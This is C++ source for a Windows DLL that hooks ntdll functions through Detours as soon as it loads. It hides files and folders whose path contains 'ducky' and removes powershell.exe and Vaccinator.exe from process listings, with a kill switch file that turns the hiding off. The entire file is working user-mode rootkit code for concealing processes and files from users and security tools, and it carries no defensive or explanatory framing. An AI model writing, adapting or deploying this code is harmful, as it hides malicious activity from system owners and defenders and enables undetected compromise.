#include <fstream>
#include <array>
#include <string>
#include <vector>

#include "winapi.h"
#include "safelogger.h"
#include "functionhook.h"
#include "detours/detours.h"

#pragma comment(lib, "ntdll.lib")

std::wstring toString(const UNICODE_STRING& unicodeString)
{
	if (unicodeString.Buffer == nullptr || unicodeString.Length == 0 || unicodeString.MaximumLength == 0)
	{
		return {};
	}

	return {unicodeString.Buffer, unicodeString.Length / sizeof(wchar_t)};
}

std::wstring getFilePath(HANDLE fileHandle)
{
	std::byte buffer[4096];
	
	ULONG ResultLength = 0;
	NtQueryObject(fileHandle, ObjectNameInformation, buffer, sizeof(buffer), &ResultLength);

	OBJECT_NAME_INFORMATION* info = reinterpret_cast<POBJECT_NAME_INFORMATION>(buffer);
	info->NameBuffer[info->Name.Length / sizeof(wchar_t)] = L'\0';

	return { info->NameBuffer };
}

bool isDisabled()
{
	return GetFileAttributes(L"C:\\StopTheHacks.Please") != INVALID_FILE_ATTRIBUTES;
}

bool shouldHidePath(const std::wstring& path)
{
	return path.find(L"ducky") != std::wstring::npos;
}

template <typename PtrType, typename Predicate>
void filterEntries(PtrType entry, NTSTATUS& result, Predicate predicate)
{
	PtrType previous_entry = entry;

	while (true)
	{
		if (predicate(*entry))
		{
			if (entry == previous_entry)
			{
				if (entry->NextEntryOffset == 0)
				{
					std::memset(entry, 0, entry->NextEntryOffset);
					result = STATUS_NOT_FOUND;
				}
				else
				{
					auto nextEntry = reinterpret_cast<PtrType>(reinterpret_cast<uintptr_t>(entry) + entry->NextEntryOffset);
					auto totalOffset = (nextEntry->NextEntryOffset ? entry->NextEntryOffset + nextEntry->NextEntryOffset : 0);
					std::memmove(entry, nextEntry, nextEntry->NextEntryOffset);
					entry->NextEntryOffset = totalOffset;
				}
			}
			else
			{
				if (entry->NextEntryOffset == 0)
				{
					previous_entry->NextEntryOffset = 0;
					std::memset(entry, 0, entry->NextEntryOffset);
				}
				else
				{
					previous_entry->NextEntryOffset += entry->NextEntryOffset;
					std::memset(entry, 0, entry->NextEntryOffset);
					entry = reinterpret_cast<PtrType>(reinterpret_cast<uintptr_t>(previous_entry) + previous_entry->NextEntryOffset);
					continue;
				}
			}
		}

		if (entry->NextEntryOffset == 0)
		{
			break;
		}

		previous_entry = entry;
		entry = reinterpret_cast<PtrType>(reinterpret_cast<uintptr_t>(entry) + entry->NextEntryOffset);
	}
};

decltype(&NtQuerySystemInformation) NtQuerySystemInformationReal;
NTSTATUS NtQuerySystemInformationFunc(SYSTEM_INFORMATION_CLASS system_information_class, PVOID system_information, ULONG system_information_length, PULONG return_length)
{
	auto result = NtQuerySystemInformationReal(system_information_class, system_information, system_information_length, return_length);

	if (result != STATUS_SUCCESS || isDisabled())
	{
		return result;
	}

	if (system_information_class == SystemProcessInformation
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x35) //SystemSessionProcessInformation
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x39) //SystemExtendedProcessInformation
		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x94) //SystemFullProcessInformation
		)
	{

		static const std::vector<std::wstring> hiddenProcess =
		{
			L"powershell.exe",
			L"Vaccinator.exe",
		};

		filterEntries(reinterpret_cast<_SYSTEM_PROCESS_INFO*>(system_information), result, [](auto& entry)
		{
			return std::find(hiddenProcess.begin(), hiddenProcess.end(), toString(entry.ImageName)) != hiddenProcess.end();
		});
	}

	return result;
}

decltype(&NtOpenFile) NtOpenFileReal;
NTSTATUS NtOpenFileFunc(PHANDLE file_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, PIO_STATUS_BLOCK io_status_block, ULONG share_access, ULONG open_options)
{
	if (!isDisabled() && object_attributes && object_attributes->ObjectName)
	{
		if (shouldHidePath(toString(*object_attributes->ObjectName)))
		{
			return STATUS_NOT_FOUND;
		}
	}

	return NtOpenFileReal(file_handle, desired_access, object_attributes, io_status_block, share_access, open_options);
}

decltype(&ZwQueryDirectoryFile) ZwQueryDirectoryFileReal;
NTSTATUS ZwQueryDirectoryFileFunc(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
	if (isDisabled())
	{
		return ZwQueryDirectoryFileReal(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	}

	if (shouldHidePath(getFilePath(FileHandle)))
	{
		return STATUS_NOT_FOUND;
	}

	NTSTATUS result = ZwQueryDirectoryFileReal(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	if (result != STATUS_SUCCESS)
	{
		return result;
	}

	auto predicate = [](auto& entry)
	{
		const std::wstring file_name = std::wstring(entry.FileName, entry.FileNameLength / sizeof(wchar_t));

		return shouldHidePath(file_name);
	};

	if (FileInformationClass == FileIdFullDirectoryInformation)
	{
		filterEntries(static_cast<PFILE_ID_BOTH_DIR_INFORMATION>(FileInformation), result, predicate);
	}
	else if (FileInformationClass == FileBothDirectoryInformation)
	{
		filterEntries(static_cast<PFILE_BOTH_DIR_INFORMATION>(FileInformation), result, predicate);
	}
	else if (FileInformationClass == FileIdBothDirectoryInformation)
	{
		filterEntries(static_cast<PFILE_ID_BOTH_DIR_INFORMATION>(FileInformation), result, predicate);
	}
	else if (FileInformationClass == FileNamesInformation)
	{
		filterEntries(static_cast<PFILE_NAME_INFORMATION>(FileInformation), result, predicate);
	}
	else if (FileInformationClass == FileFullDirectoryInformation)
	{
		filterEntries(static_cast<PFILE_FULL_DIR_INFORMATION>(FileInformation), result, predicate);
	}
	else if (FileInformationClass == FileDirectoryInformation)
	{
		filterEntries(static_cast<PFILE_DIRECTORY_INFORMATION>(FileInformation), result, predicate);
	}

	return result;
}
void Init()
{
	NtOpenFileReal = reinterpret_cast<decltype(NtOpenFileReal)>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtOpenFile"));
	ZwQueryDirectoryFileReal = reinterpret_cast<decltype(ZwQueryDirectoryFileReal)>(GetProcAddress(GetModuleHandle(L"ntdll"), "ZwQueryDirectoryFile"));
	NtQuerySystemInformationReal = reinterpret_cast<decltype(NtQuerySystemInformationReal)>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation"));

	Sleep(1000);

	DetourRestoreAfterWith();

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)NtOpenFileReal, NtOpenFileFunc);
	DetourAttach(&(PVOID&)ZwQueryDirectoryFileReal, ZwQueryDirectoryFileFunc);
	DetourAttach(&(PVOID&)NtQuerySystemInformationReal, NtQuerySystemInformationFunc);
	DetourTransactionCommit();
}

bool DllMain(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved)
{
	if (DetourIsHelperProcess()) 
	{
		return true;
	}

	if (dwReason == DLL_PROCESS_ATTACH)
	{
		CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)Init, nullptr, 0, nullptr);
	};

	return true;
}
